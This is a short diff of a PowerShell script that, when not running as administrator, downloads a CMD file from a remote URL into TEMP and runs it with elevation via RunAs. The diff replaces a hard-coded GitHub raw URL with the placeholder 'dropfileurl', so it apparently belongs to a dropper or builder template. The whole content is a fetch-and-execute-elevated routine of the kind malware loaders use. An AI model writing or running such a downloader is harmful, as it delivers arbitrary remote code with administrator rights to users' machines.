@@ -1,6 +1,6 @@
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # Download the CMD file
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$env:TEMP\run.cmd"
+    Invoke-WebRequest -Uri "dropfileurl" -OutFile "$env:TEMP\run.cmd"
     
     # Run the CMD file as admin
     Start-Process "$env:TEMP\run.cmd" -Verb RunAs
